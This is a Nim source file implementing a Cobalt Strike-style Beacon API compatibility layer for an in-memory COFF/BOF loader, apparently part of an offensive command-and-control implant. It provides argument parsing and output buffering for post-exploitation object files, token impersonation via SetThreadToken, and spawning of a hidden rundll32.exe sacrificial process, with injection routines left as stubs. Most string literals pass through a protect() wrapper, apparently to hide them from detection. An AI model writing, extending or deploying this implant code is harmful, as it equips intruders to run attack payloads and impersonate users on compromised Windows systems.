import winim/lean
import ptr_math
import strformat
import ../../common/utils 

#[
    References: 
    - https://github.com/frkngksl/NiCOFF/blob/main/BeaconFunctions.nim 
    - https://github.com/trustedsec/COFFLoader/blob/main/beacon_compatibility.c
    - https://github.com/Cracked5pider/CoffeeLdr/blob/main/Source/BeaconApi.c  
]#

const
    CALLBACK_OUTPUT      = 0x0
    CALLBACK_OUTPUT_OEM  = 0x1e
    CALLBACK_ERROR       = 0x0d
    CALLBACK_OUTPUT_UTF8 = 0x20
    DEFAULT_PROCESS = protect("rundll32.exe")

type
    datap* {.bycopy,packed.} = object
        original*: PCHAR
        buffer*: PCHAR
        length*: int
        size*: int

    formatp* {.bycopy,packed.} = object
        original*: PCHAR
        buffer*: PCHAR
        length*: int
        size*: int

# Reference: https://forum.nim-lang.org/t/7352
type va_list* {.importc: "va_list", header: "<stdarg.h>".} = object
proc va_start(format: va_list, args: PCHAR) {.stdcall, importc, header: "stdio.h"}
proc va_end(ap: va_list) {.stdcall, importc, header: "stdio.h"}
proc vprintf(format: cstring, args: va_list) {.stdcall, importc, header: "stdio.h"}
proc vsnprintf(buffer: cstring; size: int; fmt: cstring; args: va_list): int {.stdcall, importc, dynlib: "msvcrt".}

var beaconCompatibilityOutput: PCHAR = nil
var beaconCompatibilitySize: int = 0
var beaconCompatibilityOffset: int = 0

#[
    Parsing
]#
proc BeaconDataParse(parser: ptr datap, buffer: PCHAR, size: int): void {.stdcall.} =
    if cast[uint64](parser) == 0:
        return

    parser.original = buffer
    parser.buffer = buffer
    parser.length = size - 4
    parser.size = size - 4
    parser.buffer += 4
    return

proc BeaconDataInt(parser: ptr datap): int {.stdcall.}=
    if cast[uint64](parser) == 0:
        return

    var returnValue: int = 0
    if parser.length < 4:
        return returnValue
    
    copyMem(addr returnValue, parser.buffer, 4)
    parser.length -= 4
    parser.buffer += 4
    return returnValue

proc BeaconDataShort(parser: ptr datap): int16 {.stdcall.} =
    if cast[uint64](parser) == 0:
        return

    var returnValue: int16 = 0
    if parser.length < 2:
        return returnValue

    copyMem(addr returnValue, parser.buffer, 2)
    parser.length -= 2
    parser.buffer += 2
    return returnValue

proc BeaconDataLength(parser: ptr datap): int {.stdcall.} =
    if cast[uint64](parser) == 0:
        return
    
    return parser.length

proc BeaconDataExtract(parser: ptr datap, size: ptr int): PCHAR {.stdcall.} =
    if cast[uint64](parser) == 0:
        return

    var 
        length: int32 = 0
        outData: PCHAR = nil
    
    # Length of prefixed binary blob
    if parser.length < 4:
        return NULL
    copyMem(addr length, parser.buffer, 4)
    parser.buffer += 4

    outData = parser.buffer
    if(outData == NULL):
        return NULL
    parser.length -= 4
    parser.length -= length
    parser.buffer += length
    if(size != NULL and outData != NULL):
        size[] = length
    return outData

#[
    Formatting
]#
proc BeaconFormatAlloc(format: ptr formatp, maxsz: int): void {.stdcall.} =
    if format == NULL:
        return

    format.original = cast[PCHAR](alloc(maxsz))
    zeroMem(format.original, maxsz)
    format.buffer = format.original
    format.length = 0
    format.size = maxsz

proc BeaconFormatReset(format: ptr formatp): void {.stdcall.} =
    if format == NULL:
        return

    zeroMem(format.original, format.size)
    format.buffer = format.original
    format.length = format.size

proc BeaconFormatFree(format: ptr formatp): void {.stdcall.} =
    if format == NULL:
        return

    if cast[uint64](format.original) != 0:
        dealloc(format.original)
        format.original = NULL

    format.buffer = NULL
    format.length = 0
    format.size = 0

proc BeaconFormatAppend(format: ptr formatp, text: PCHAR, len: int): void {.stdcall.} =
    if format == NULL or text == NULL:
        return

    copyMem(format.buffer,text,len)
    format.buffer += len
    format.length += len

proc BeaconFormatPrintf(format: ptr formatp, fmt: PCHAR): void {.stdcall, varargs.} =
    if format == NULL or fmt == NULL:
        return
    
    var args: va_list
    var length: int = 0

    va_start(args, fmt)
    length = vsnprintf(NULL, 0, fmt, args)
    va_end(args)
    
    if format.length + length > format.size:
        return

    va_start(args, fmt)
    discard vsnprintf(format.buffer, length, fmt, args)
    va_end(args)
    format.length += length
    format.buffer += length

proc BeaconFormatToString(format: ptr formatp, size: ptr int): PCHAR {.stdcall.} =
    if format == NULL or size == NULL:
        return

    size[] = format.length
    return format.original

proc swapEndianess(indata: uint32): uint32 =
    var testInt: uint32 = cast[uint32](0xaabbccdd)
    var outInt: uint32 = indata
    if(cast[PBYTE](addr testInt)[] == 0xdd):
        cast[PBYTE](addr outInt)[] = (cast[PBYTE](addr indata)+3)[]
        (cast[PBYTE](addr outInt)+1)[] = (cast[PBYTE](addr indata)+2)[]
        (cast[PBYTE](addr outInt)+2)[] = (cast[PBYTE](addr indata)+1)[]
        (cast[PBYTE](addr outInt)+3)[] = cast[PBYTE](addr indata)[]
    return outint

proc BeaconFormatInt(format: ptr formatp, value: int): void =
    if format == NULL:
        return

    var indata:uint32 = cast[uint32](value)
    var outdata:uint32 = 0
    if format.length + 4 > format.size:
        return
    outdata = swapEndianess(indata)
    copyMem(format.buffer, addr outdata, 4)
    format.length += 4
    format.buffer += 4

#[ 
    Output functions
]#
proc BeaconPrintf(typeArg: int, fmt: PCHAR):void{.stdcall, varargs.} =
    if fmt == NULL:
        return

    var length: int = 0
    var tempPtr: PCHAR = nil
    var args: va_list
    va_start(args, fmt)
    vprintf(fmt, args)
    va_end(args)

    va_start(args, fmt)
    length = vsnprintf(NULL, 0, fmt, args)
    va_end(args)
    tempPtr = cast[PCHAR](realloc(beaconCompatibilityOutput,beaconCompatibilitySize + length + 1))
    if tempPtr == nil:
        return
    beaconCompatibilityOutput = tempPtr
    zeroMem(beaconCompatibilityOutput + beaconCompatibilityOffset, length + 1)
    va_start(args, fmt)
    length = vsnprintf(beaconCompatibilityOutput+beaconCompatibilityOffset,length,fmt,args)
    beaconCompatibilitySize += length
    beaconCompatibilityOffset += length
    va_end(args)
    
proc BeaconOutput(typeArg: int, data: PCHAR, len: int): void {.stdcall.} =
    if data == NULL:
        return

    var tempPtr: PCHAR = nil
    tempPtr = cast[PCHAR](realloc(beaconCompatibilityOutput,beaconCompatibilitySize + len + 1))
    beaconCompatibilityOutput = tempPtr
    if tempPtr == nil:
        return
    zeroMem(beaconCompatibilityOutput + beaconCompatibilityOffset, len + 1)
    copyMem(beaconCompatibilityOutput + beaconCompatibilityOffset, data, len)
    beaconCompatibilitySize += len
    beaconCompatibilityOffset += len
    
#[
    Token functions
]#
proc BeaconUseToken(token: HANDLE): BOOL {.stdcall.} =
    SetThreadToken(NULL, token)
    return TRUE

# void BeaconRevertToken();
proc BeaconRevertToken(): void {.stdcall.} =
    RevertToSelf()

# BOOL BeaconIsAdmin();
proc BeaconIsAdmin(): BOOL {.stdcall.}=
    # Not implemented
    return FALSE

#[ 
    Spawn+Inject Functions
]# 
proc BeaconGetSpawnTo(x86: BOOL, buffer: PCHAR, length: int): void {.stdcall.} =
    if buffer == NULL:
        return 

    var tempBufferPath: string = ""
    if cast[uint64](buffer) == 0:
        return 

    if x86 == TRUE:
        tempBufferPath = fmt"C:\Windows\SysWOW64\{DEFAULT_PROCESS}"
    else:
        tempBufferPath = fmt"C:\Windows\System32\{DEFAULT_PROCESS}"
    
    if tempBufferPath.len > length:
        return
    copyMem(buffer, addr tempBufferPath[0], tempBufferPath.len)

proc BeaconSpawnTemporaryProcess(x86: BOOL, ignoreToken: BOOL, sInfo: ptr STARTUPINFOA, pInfo: ptr PROCESS_INFORMATION): BOOL {.stdcall.} =
    var bSuccess: BOOL = FALSE

    if x86 == TRUE:
        bSuccess = CreateProcessA(NULL, fmt"C:\Windows\SysWOW64\{DEFAULT_PROCESS}", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, sInfo, pInfo)
    else:
        bSuccess = CreateProcessA(NULL, fmt"C:\Windows\System32\{DEFAULT_PROCESS}", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, sInfo, pInfo)
    
    return bSuccess

proc BeaconInjectProcess(hProc: HANDLE, pid: int, payload: PCHAR, p_len: int, p_offset: int, arg: PCHAR, a_len: int): void {.stdcall.} =
    # Not implemented
    return

proc BeaconInjectTemporaryProcess(pInfo: ptr PROCESS_INFORMATION, payload: PCHAR, p_len: int, p_offset: int, arg: PCHAR, a_len: int): void {.stdcall.} =
    # Not implemented
    return

proc BeaconCleanupProcess(pInfo: ptr PROCESS_INFORMATION): void {.stdcall.} =
    CloseHandle(pInfo.hThread)
    CloseHandle(pInfo.hProcess)

#[
    Utility Functions
]# 
proc toWideChar(src: PCHAR, dst: PCHAR, max: int): BOOL {.stdcall.} =
    # Not implemented
    return FALSE

proc BeaconGetOutputData*(outSize: ptr int): PCHAR {.stdcall.} =
    var outData: PCHAR = beaconCompatibilityOutput
    
    if cast[uint64](outSize) != 0:
        outsize[] = beaconCompatibilitySize
    beaconCompatibilityOutput = NULL
    beaconCompatibilitySize = 0
    beaconCompatibilityOffset = 0
    return outData

var beaconApiAddresses*: array[23, tuple[name: string, address: PVOID]] = [
    (protect("BeaconDataParse"), BeaconDataParse),
    (protect("BeaconDataInt"), BeaconDataInt),
    (protect("BeaconDataShort"), BeaconDataShort),
    (protect("BeaconDataLength"), BeaconDataLength),
    (protect("BeaconDataExtract"), BeaconDataExtract),
    (protect("BeaconFormatAlloc"), BeaconFormatAlloc),
    (protect("BeaconFormatReset"), BeaconFormatReset),
    (protect("BeaconFormatFree"), BeaconFormatFree),
    (protect("BeaconFormatAppend"), BeaconFormatAppend),
    (protect("BeaconFormatPrintf"), BeaconFormatPrintf),
    (protect("BeaconFormatToString"), BeaconFormatToString),
    (protect("BeaconFormatInt"), BeaconFormatInt),
    (protect("BeaconPrintf"), BeaconPrintf),
    (protect("BeaconOutput"), BeaconOutput),
    (protect("BeaconUseToken"), BeaconUseToken),
    (protect("BeaconRevertToken"), BeaconRevertToken),
    (protect("BeaconIsAdmin"), BeaconIsAdmin),
    (protect("BeaconGetSpawnTo"), BeaconGetSpawnTo),
    (protect("BeaconSpawnTemporaryProcess"), BeaconSpawnTemporaryProcess),
    (protect("BeaconInjectProcess"), BeaconInjectProcess),
    (protect("BeaconInjectTemporaryProcess"), BeaconInjectTemporaryProcess),
    (protect("BeaconCleanupProcess"), BeaconCleanupProcess),
    (protect("toWideChar"), toWideChar)
]